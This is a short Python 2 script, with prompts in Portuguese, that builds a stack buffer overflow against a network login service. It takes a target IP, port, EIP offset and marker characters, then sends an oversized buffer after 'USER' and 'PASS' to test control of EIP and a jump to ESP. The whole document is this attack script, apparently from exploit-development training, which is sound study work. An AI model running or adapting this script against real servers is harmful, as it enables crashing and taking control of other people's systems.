#!/usr/bin/python
#-*-coding: utf-8-*-
import socket

ip = raw_input("➤➤ Digite o IP do alvo: ")
porta = int(input("➤➤ Digite a porta do alvo: "))
buffer = int(input("➤➤ Digite o valor do eip: "))
sob = raw_input("➤➤ Digite 4 letras maiúsculas para sobrescrever o eip: ")
es = raw_input("➤➤ Digite uma letra maiúscula para testar jump de eip para esp: ")
buffer1 = "A" * buffer + sob + es * (3000 - 2610)



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,porta))
res = s.recv(1024)
print(res)

s.send("USER teste\r\n")
res = s.recv(1024)
print(res)

s.send("PASS"+buffer1+"\r\n")
res = s.recv(1024)
print(res)

s.send("QUIT\r\n")
res = s.recv(1024)
print(res)


